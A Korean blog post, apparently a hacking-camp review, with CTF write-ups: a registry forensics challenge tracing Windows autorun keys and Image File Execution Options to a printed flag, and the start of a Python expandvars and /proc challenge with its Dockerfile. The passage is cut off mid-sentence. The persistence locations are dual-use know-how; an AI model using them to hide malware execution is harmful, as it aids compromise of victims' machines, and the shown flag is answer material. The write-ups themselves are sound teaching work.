&lt;p&gt;&amp;#xC544;&amp;#xC27D;&amp;#xAC8C;&amp;#xB3C4; &amp;#xC0C1;&amp;#xB300;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xB098;&amp;#xC774;&amp;#xB97C; &amp;#xB9CE;&amp;#xC774; &amp;#xBA39;&amp;#xC740; &amp;#xC81C;&amp;#xAC00; &amp;#xC624;&amp;#xAE30;&amp;#xC5D4; &amp;#xD55C;&amp;#xBC88;&amp;#xC774; &amp;#xC801;&amp;#xB2F9;&amp;#xD55C; &amp;#xAC83; &amp;#xAC19;&amp;#xACE0; &amp;#xC774;&amp;#xC81C; &amp;#xB9C9; &amp;#xBCF4;&amp;#xC548;&amp;#xC744; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; &amp;#xD639;&amp;#xC740; &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xBCF4;&amp;#xC548;&amp;#xC5D0; &amp;#xAD00;&amp;#xC2EC;&amp;#xC744; &amp;#xAC00;&amp;#xC9C0;&amp;#xACE0; &amp;#xB354; &amp;#xB9CE;&amp;#xC740; &amp;#xAE38;&amp;#xC744; &amp;#xAC77;&amp;#xACE0; &amp;#xC2F6;&amp;#xC5B4; &amp;#xD558;&amp;#xB294; &amp;#xD6C4;&amp;#xBC30;&amp;#xB4E4;&amp;#xC5D0;&amp;#xAC8C; &amp;#xCD94;&amp;#xCC9C;&amp;#xD574;&amp;#xC8FC;&amp;#xB824;&amp;#xACE0; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB3D9;&amp;#xC544;&amp;#xB9AC; &amp;#xB0B4;&amp;#xBD80;CTF&amp;#xC5D0; &amp;#xC0C1;&amp;#xD488;&amp;#xC73C;&amp;#xB85C; &amp;#xAC78;&amp;#xAE4C;&amp;#xB3C4; &amp;#xC0DD;&amp;#xAC01; &amp;#xC911;&amp;#xC774;&amp;#xACE0;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xC88B;&amp;#xC740; &amp;#xBC1C;&amp;#xD45C; &amp;#xC798; &amp;#xB4E4;&amp;#xC5C8;&amp;#xACE0; 28&amp;#xD68C;&amp;#xC5D0;&amp;#xB294; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xCC38;&amp;#xAC00;&amp;#xD558;&amp;#xAE38; &amp;#xAE30;&amp;#xB300;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&amp;#xC11C; &amp;#xBCF4;&amp;#xC548; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB97C; &amp;#xC774;&amp;#xC5B4; &amp;#xB098;&amp;#xAC00; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;pwndorei&#34;&gt;&lt;a href=&#34;#pwndorei&#34; class=&#34;headerlink&#34; title=&#34;pwndorei&#34;&gt;&lt;/a&gt;pwndorei&lt;/h2&gt;&lt;p&gt;&amp;#xC6D0;&amp;#xB798;&amp;#xB294; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD588;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC544;&amp;#xC27D;&amp;#xAC8C;&amp;#xB3C4; &amp;#xB5A8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xBA74;&amp;#xC11C; &amp;#xB2E4;&amp;#xC74C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xB85C; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD560; &amp;#xB54C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC758; &amp;#xBD84;&amp;#xC704;&amp;#xAE30;&amp;#xB098; &amp;#xC9C4;&amp;#xD589; &amp;#xBC29;&amp;#xC2DD;&amp;#xC744; &amp;#xC54C;&amp;#xBA74; &amp;#xC88B;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xACE0; &amp;#xB2E4;&amp;#xB978; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xBD84;&amp;#xB4E4;&amp;#xC758; &amp;#xC8FC;&amp;#xC81C;&amp;#xAC00; &amp;#xB108;&amp;#xBB34; &amp;#xB9E4;&amp;#xB825;&amp;#xC801;&amp;#xC774;&amp;#xC5B4;&amp;#xC11C; &amp;#xCC38;&amp;#xAC00;&amp;#xC790;&amp;#xB85C; &amp;#xB2E4;&amp;#xC2DC; &amp;#xC9C0;&amp;#xC6D0;&amp;#xD558;&amp;#xC5EC; &amp;#xCC38;&amp;#xAC00;&amp;#xD558;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! &lt;/p&gt;
&lt;p&gt;&amp;#xC0DD;&amp;#xAC01;&amp;#xBCF4;&amp;#xB2E4; &amp;#xBC1C;&amp;#xD45C;&amp;#xC790;&amp;#xC640; &amp;#xCC38;&amp;#xC5EC;&amp;#xC790; &amp;#xD3C9;&amp;#xADE0; &amp;#xC5F0;&amp;#xB839;&amp;#xC774; &amp;#xB0AE;&amp;#xC544;&amp;#xC11C; &amp;#xB180;&amp;#xB790;&amp;#xACE0; &amp;#xC5B4;&amp;#xB9B0; &amp;#xB098;&amp;#xC774;&amp;#xC5D0; &amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xC740; &amp;#xBD84;&amp;#xC57C;&amp;#xC5D0; &amp;#xBAB0;&amp;#xB450;&amp;#xD558;&amp;#xB294; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC774; &amp;#xC815;&amp;#xB9D0; &amp;#xBA4B;&amp;#xC84C;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC911;&amp;#xACE0;&amp;#xB4F1;&amp;#xD559;&amp;#xAD50;&amp;#xC758; &amp;#xD559;&amp;#xC5C5;&amp;#xACFC; &amp;#xD574;&amp;#xD0B9; &amp;#xACF5;&amp;#xBD80;&amp;#xB97C; &amp;#xBCD1;&amp;#xD589;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xC774;&amp;#xB7F0; &amp;#xD589;&amp;#xC0AC;&amp;#xC5D0; &amp;#xCC38;&amp;#xC5EC;&amp;#xD558;&amp;#xB294; &amp;#xC5F4;&amp;#xC815;&amp;#xC740; &amp;#xC800;&amp;#xB3C4; &amp;#xBCF8;&amp;#xBC1B;&amp;#xC544;&amp;#xC57C; &amp;#xD560; &amp;#xAC83; &amp;#xAC19;&amp;#xB354;&amp;#xAD70;&amp;#xC694;. &amp;#xC591;&amp;#xC9C8;&amp;#xC758; &amp;#xBC1C;&amp;#xD45C;&amp;#xB4E4;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xB2E4;&amp;#xC591;&amp;#xD55C; &amp;#xBD84;&amp;#xC57C;&amp;#xC758; &amp;#xC9C0;&amp;#xC2DD;&amp;#xB4E4;&amp;#xC744; &amp;#xC5BB;&amp;#xC5C8;&amp;#xC73C;&amp;#xB2C8; &amp;#xB2E4;&amp;#xC74C; &amp;#xD574;&amp;#xD0B9;&amp;#xCEA0;&amp;#xD504;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1B;&amp;#xC740; &amp;#xB9CC;&amp;#xD07C; &amp;#xB3CC;&amp;#xB824;&amp;#xB4DC;&amp;#xB9B4; &amp;#xC218; &amp;#xC788;&amp;#xB3C4;&amp;#xB85D; &amp;#xB178;&amp;#xB825;&amp;#xD558;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h1 id=&#34;Write-Up&#34;&gt;&lt;a href=&#34;#Write-Up&#34; class=&#34;headerlink&#34; title=&#34;Write-Up&#34;&gt;&lt;/a&gt;Write-Up&lt;/h1&gt;&lt;h3 id=&#34;REGISTRIP-L0ch&#34;&gt;&lt;a href=&#34;#REGISTRIP-L0ch&#34; class=&#34;headerlink&#34; title=&#34;REGISTRIP - L0ch&#34;&gt;&lt;/a&gt;REGISTRIP - L0ch&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xD3EC;&amp;#xB80C;&amp;#xC2DD; &amp;#xBB38;&amp;#xC81C;&amp;#xB85C;, Description&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &amp;#xD0A4;&amp;#xC6CC;&amp;#xB4DC;&amp;#xAC00; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xBB38;&amp;#xC81C;&amp;#xC758; &amp;#xD0A4;&amp;#xC6CC;&amp;#xB4DC;&amp;#xB294; automatically run &amp;#xC774; &amp;#xB418;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; &amp;#xC81C;&amp;#xACF5;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xBCF4;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%201.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;Windows &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD558;&amp;#xC774;&amp;#xBE0C; &amp;#xD30C;&amp;#xC77C;&amp;#xC784;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6B0;&amp;#xB9AC;&amp;#xAC00; &amp;#xBCF4;&amp;#xD1B5; &amp;#xC544;&amp;#xB294; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC;&amp;#xB294; regedit &amp;#xD3B8;&amp;#xC9D1;&amp;#xAE30;&amp;#xB85C; &amp;#xBCF4;&amp;#xB294; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC00; &amp;#xC775;&amp;#xC219;&amp;#xD55C;&amp;#xB370;&amp;#xC694;, &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xBD84;&amp;#xC11D; &amp;#xD234; REGA&amp;#xC778; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xD30C;&amp;#xC77C;&amp;#xB4E4;&amp;#xC744; &amp;#xC775;&amp;#xC219;&amp;#xD55C; &amp;#xD2B8;&amp;#xB9AC; &amp;#xD3EC;&amp;#xB9F7;&amp;#xC73C;&amp;#xB85C; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%202.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%203.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xC81C;&amp;#xC57C; &amp;#xC880; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xB9DB;&amp;#xC774; &amp;#xB098;&amp;#xB124;&amp;#xC694;!&lt;/p&gt;
&lt;p&gt;Windows Registry + Automatically Run &amp;#xD0A4;&amp;#xC6CC;&amp;#xB4DC;&amp;#xB97C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74;, &amp;#xBB38;&amp;#xC81C; &amp;#xCEE8;&amp;#xC149;&amp;#xC740; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC790;&amp;#xC8FC; &amp;#xC545;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; auto run &amp;#xAD00;&amp;#xB828; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xB4E4;&amp;#xC744; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xB2E8;&amp;#xC11C;&amp;#xAC00; &amp;#xC788;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
&lt;p&gt;Auto Run&amp;#xACFC; &amp;#xAD00;&amp;#xB828;&amp;#xB41C; Windows &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xB294; &amp;#xC6B0;&amp;#xC120; &amp;#xC774;&amp;#xC815;&amp;#xB3C4;&amp;#xB85C; &amp;#xC0DD;&amp;#xAC01;&amp;#xD574; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;#xD574;&amp;#xB2F9; &amp;#xD0A4;&amp;#xB4E4;&amp;#xC758; value&amp;#xB97C; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBCF4;&amp;#xBA74; &amp;#xC218;&amp;#xC0C1;&amp;#xD55C; &amp;#xAC12;&amp;#xB4E4;&amp;#xC774; &amp;#xBCF4;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%204.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; &lt;/p&gt;
&lt;p&gt;1 : 7cf7a9d2d0&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%205.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2 : ac21fb716b&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%206.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3 : 1e032c79c4&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs vbnet&#34;&gt;Here&lt;span class=&#34;hljs-comment&#34;&gt;&amp;apos;s the hint for the last fragment. &lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Every time I run Notepad, a strange file runs with it...&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC138; &amp;#xBC88;&amp;#xC9F8; value Data&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00; &amp;#xD78C;&amp;#xD2B8;&amp;#xAC00; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;Notepad&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xB54C;&amp;#xB9C8;&amp;#xB2E4; &amp;#xC774;&amp;#xC0C1;&amp;#xD55C; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xAC19;&amp;#xC774; &amp;#xC2E4;&amp;#xD589;&amp;#xB41C;&amp;#xB2E4;&amp;#xACE0; &amp;#xD558;&amp;#xB294;&amp;#xB370;, &amp;#xC774;&amp;#xAC83;&amp;#xC774; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; fragment&amp;#xC778; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4; &amp;#xC911; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC; &amp;#xC2E4;&amp;#xD589; &amp;#xC635;&amp;#xC158; &amp;#xAD00;&amp;#xB828;  &lt;code&gt;Image File Execution Options&lt;/code&gt;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2023/09/03/l0ch/hackingcamp_review/Untitled%207.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xD0A4;&amp;#xC5D0; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; fragment&amp;#xAC00; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs mathematica&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;Image&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;File&lt;/span&gt; Execution &lt;span class=&#34;hljs-keyword&#34;&gt;Options&lt;/span&gt;
&amp;#xD574;&amp;#xB2F9; &amp;#xC11C;&amp;#xBE0C; &amp;#xD0A4;&amp;#xC5D0; &amp;#xC2E4;&amp;#xD589;&amp;#xAC00;&amp;#xB2A5; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0; &amp;#xBC0F; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC; &amp;#xC2DC;, Debugger &amp;#xAC12;&amp;#xC744; &amp;#xCC38;&amp;#xC870;&amp;#xD574; &amp;#xD574;&amp;#xB2F9; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0;&amp;#xB97C; &amp;#xBA3C;&amp;#xC800; &amp;#xC2E4;&amp;#xD589;.
&amp;#xB514;&amp;#xBC84;&amp;#xAE45;&amp;#xC744; &amp;#xC704;&amp;#xD574; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB098; &amp;#xC5B4;&amp;#xB5A4; &amp;#xC774;&amp;#xBBF8;&amp;#xC9C0;&amp;#xAC00; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294;&amp;#xC9C0; &amp;#xAC80;&amp;#xC99D;&amp;#xD560; &amp;#xC218; &amp;#xC5C6;&amp;#xC5B4; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xC2E4;&amp;#xD589; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB85C; &amp;#xC545;&amp;#xC6A9;&amp;#xB418;&amp;#xAE30;&amp;#xB3C4; &amp;#xD568;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;base64 &amp;#xC778;&amp;#xCF54;&amp;#xB529; &amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC73C;&amp;#xB2C8; &amp;#xB514;&amp;#xCF54;&amp;#xB529;&amp;#xD574;&amp;#xC8FC;&amp;#xBA74; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; fragment&amp;#xAC00; &amp;#xB098;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;4 : 0d1e872378&lt;/p&gt;
&lt;p&gt;1~4&amp;#xC758; Fragment &amp;#xC774;&amp;#xC5B4;&amp;#xBD99;&amp;#xC774;&amp;#xBA74; Flag&amp;#xB97C; &amp;#xD68D;&amp;#xB4DD;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;HCAMP&lt;/span&gt;{&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;cf&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;ac&lt;span class=&#34;hljs-number&#34;&gt;21&lt;/span&gt;fb&lt;span class=&#34;hljs-number&#34;&gt;716&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;032&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;79&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;40&lt;/span&gt;d&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;e&lt;span class=&#34;hljs-number&#34;&gt;872378&lt;/span&gt;}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;1 solve&amp;#xB85C; &amp;#xB05D;&amp;#xB09C; &amp;#xBB38;&amp;#xC81C;&amp;#xB77C;&amp;#xC11C; CTF &amp;#xC885;&amp;#xB8CC; &amp;#xD6C4; &amp;#xAC04;&amp;#xB2E8;&amp;#xD558;&amp;#xAC8C; &amp;#xD480;&amp;#xC774; &amp;#xBC29;&amp;#xBC95;&amp;#xC744; &amp;#xBC1C;&amp;#xD45C;&amp;#xD558;&amp;#xAE30;&amp;#xB3C4; &amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xADF8;&amp;#xB798;&amp;#xB3C4; &amp;#xC26C;&amp;#xC6B4; &amp;#xD3B8;&amp;#xC5D0; &amp;#xC18D;&amp;#xD558;&amp;#xB294; &amp;#xBB38;&amp;#xC81C;&amp;#xC600;&amp;#xB358; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;del&gt;Windows Heap &amp;#xACF5;&amp;#xBD80;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xB808;&amp;#xC9C0;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB9AC; &amp;#xB4E4;&amp;#xC464;&amp;#xC2E0; &amp;#xAE30;&amp;#xC5B5;&amp;#xC774; &amp;#xC0C8;&amp;#xB85D;&amp;#xC0C8;&amp;#xB85D;&lt;/del&gt; &lt;/p&gt;
&lt;p&gt;CTF&amp;#xAC00; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC774;&amp;#xB77C; &amp;#xAC71;&amp;#xC815;&amp;#xD588;&amp;#xB294;&amp;#xB370; &amp;#xC88B;&amp;#xC740; &amp;#xD300;&amp;#xC6D0;&amp;#xBD84;&amp;#xB4E4;&amp;#xC744; &amp;#xB9CC;&amp;#xB098; 1&amp;#xB4F1;&amp;#xAE4C;&amp;#xC9C0; &amp;#xD588;&amp;#xB124;&amp;#xC694;. &amp;#xC800;&amp;#xB3C4; 1&amp;#xC778;&amp;#xBD84;&amp;#xC740; &amp;#xD574;&amp;#xC11C; &amp;#xB2E4;&amp;#xD589;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;#x314E;&amp;#x314E; &lt;/p&gt;
&lt;h2 id=&#34;README-syru&#34;&gt;&lt;a href=&#34;#README-syru&#34; class=&#34;headerlink&#34; title=&#34;README - syru&#34;&gt;&lt;/a&gt;&lt;strong&gt;README - syru&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;python&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xC778; &lt;code&gt;expandvars&lt;/code&gt;&amp;#xC640; &amp;#xB9AC;&amp;#xB205;&amp;#xC2A4;&amp;#xC758; proc file system&amp;#xC744; &amp;#xD65C;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xBB38;&amp;#xC81C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBB38;&amp;#xC81C; &amp;#xC11C;&amp;#xBC84;&amp;#xB97C; &amp;#xAD6C;&amp;#xCD95;&amp;#xD558;&amp;#xB294; &amp;#xB370; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xC81C;&amp;#xACF5;&amp;#xB418;&amp;#xC5B4; &amp;#xB354; &amp;#xC218;&amp;#xC6D4;&amp;#xD558;&amp;#xAC8C; &amp;#xD480; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC6B0;&amp;#xC120; &amp;#xC544;&amp;#xB798; Dockerfile&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;/flag&lt;/code&gt; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xBAA8;&amp;#xB450;&amp;#xAC00; &amp;#xC77D;&amp;#xAE30; &amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xC0C1;&amp;#xD0DC;&amp;#xB85C; flag &amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; &lt;code&gt;CONFIG=/proc&lt;/code&gt;&amp;#xC774;&amp;#xB77C;&amp;#xB294; &amp;#xD658;&amp;#xACBD;&amp;#xBCC0;&amp;#xC218;&amp;#xAC00; &amp;#xB4F1;&amp;#xB85D;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; &amp;#xC810;&amp;#xC744; &amp;#xB208;&amp;#xC5EC;&amp;#xACA8; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs shell&#34;&gt;FROM python:3.10-slim-buster

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update &amp;amp;&amp;amp; apt-get install -yqq socat
RUN groupadd -r ctf &amp;amp;&amp;amp; useradd -r -g ctf ctf

RUN echo &amp;quot;flag{fake}&amp;quot; &amp;gt; /flag
RUN chmod 444 /flag

USER ctf
WORKDIR /app
ADD server.py .

ENV CONFIG=&amp;quot;/proc&amp;quot;

CMD socat TCP-L:9999,fork,reuseaddr EXEC:&amp;quot;python server.py&amp;quot;,pty,ctty,stderr,echo=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798; server.py&amp;#xB3C4; &amp;#xC0B4;&amp;#xD3B4;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC6B0;&amp;#xC120; main&amp;#xC774; &amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; flag &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xC5F4;&amp;#xACE0; &lt;strong&gt;&amp;#xB2EB;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xC73C;&amp;#xBA70;&lt;/strong&gt; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xC758; &amp;#xC785;&amp;#xB825;&amp;#xC744; &lt;code&gt;filtering&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xC5EC; &amp;#xD544;&amp;#xD130;&amp;#xB9C1;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD55C; &amp;#xB4A4; &lt;code&gt;os.path.expandvars&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCD5C;&amp;#xC885; file path&amp;#xB97C; 